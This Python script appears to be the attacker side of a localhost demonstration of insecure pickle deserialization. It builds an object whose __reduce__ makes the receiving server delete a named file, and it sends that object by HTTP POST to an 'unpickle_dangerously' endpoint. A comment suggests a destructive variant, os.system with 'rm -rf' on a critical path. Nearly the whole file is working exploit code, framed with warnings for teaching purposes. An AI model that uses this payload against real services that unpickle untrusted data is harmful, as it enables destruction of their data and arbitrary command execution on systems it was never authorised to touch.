import pickle
import os
import requests # To send the payload to the server

# --- Configuration ---
# This file will be targeted for deletion by the malicious pickle.
# The server should create this file in its own working directory.
TARGET_FILE_TO_DELETE = "IMPORTANT_FILE_DEMO.txt"
SERVER_URL = "http://127.0.0.1:5000/unpickle_dangerously"

# --- Attacker's Side: Crafting the malicious pickle ---
class MaliciousDeletePickle:
    def __reduce__(self):
        # This tells pickle to call 'os.remove' with TARGET_FILE_TO_DELETE as an argument.
        # WARNING: In a real attack, this could be any command or file path.
        # For example: (os.system, ('rm -rf /some/critical/path',)) # EXTREMELY DANGEROUS
        print(f"[ATTACKER] __reduce__ called. Targeting '{TARGET_FILE_TO_DELETE}' for deletion by os.remove.")
        return (os.remove, (TARGET_FILE_TO_DELETE,))

print("--- Attacker's Side ---")
print("WARNING: This script will generate a pickle payload designed to delete a file on the target server.")

# 1. Create the malicious object
malicious_object = MaliciousDeletePickle()

# 2. Serialize it into a pickle payload
evil_pickle_data = pickle.dumps(malicious_object)
print(f"Generated malicious pickle data (length: {len(evil_pickle_data)} bytes).")
print("This 'evil_pickle_data' will now be sent to the victim server.\n")

# 3. Send the payload to the server
input(f"Press Enter to send the malicious pickle payload to the server at {SERVER_URL}...")

try:
    response = requests.post(SERVER_URL, data=evil_pickle_data, headers={'Content-Type': 'application/octet-stream'})
    print("\n--- Attacker: Sent payload to server ---")
    print(f"Server Response Status Code: {response.status_code}")
    print(f"Server Response Body: {response.text}")
except requests.exceptions.ConnectionError:
    print(f"\n[ATTACKER] Could not connect to the server at {SERVER_URL}.")
    print("Please ensure the victim_server.py is running.")
except Exception as e:
    print(f"\n[ATTACKER] An error occurred while sending data: {e}")